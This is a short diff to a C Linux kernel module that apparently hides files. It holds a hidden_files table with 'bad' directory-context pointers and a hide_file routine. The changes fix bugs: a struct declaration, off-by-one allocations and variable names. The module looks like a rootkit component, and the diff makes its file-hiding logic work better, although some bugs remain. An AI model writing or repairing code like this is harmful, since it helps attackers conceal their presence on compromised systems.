@@ -74,7 +74,8 @@ struct hidden_file {
     struct inode* inode;
     struct dir_context* backup_ctx;
     struct dir_context* bad_ctx;
-} static struct hidden_file hidden_files[256];
+};
+static struct hidden_file hidden_files[256];
 int hidden_file_count = 0;
 
 static rwlock_t* my_tasklist_lock;
@@ -633,17 +634,17 @@ bool hide_file(const char* user_input, struct hidden_file* hf) {
     int i, j;
     size_t str_size;
 
-    char* user_dir = kmalloc(strlen(user_input), GFP_KERNEL);
-    strcpy(user_string, user_input);
-    char* user_file = kmalloc(strlen(user_input), GFP_KERNEL);
+    char* user_dir = kmalloc(strlen(user_input) + 1, GFP_KERNEL);
+    strcpy(user_dir, user_input);
+    char* user_file = kmalloc(strlen(user_input) + 1, GFP_KERNEL);
     memset(user_file, 0, strlen(user_input));
 
-    for (i = strlen(user_string) - 1; i >= 0; --i) {
-        if (user_string[i] == '/') {
+    for (i = strlen(user_dir) - 1; i >= 0; --i) {
+        if (user_dir[i] == '/') {
             break;
         }
-        user_file[j++] = user_string[i];
-        user_string[i] = '\0';
+        user_file[j++] = user_dir[i];
+        user_dir[i] = '\0';
     }
     str_size = strlen(user_file);
     for (i = 0; i < str_size / 2; ++i) {
@@ -696,7 +697,7 @@ static int __init mod_init(void) {
 
     //Zero out the hidden file names
     for (i = 0; i < 100; ++i) {
-        memset(hidden_files[i], 0, 256);
+        //memset(hidden_files[i], 0, 256);
     }
 
     //if (kern_path("/proc", 0, &proc_path)) {
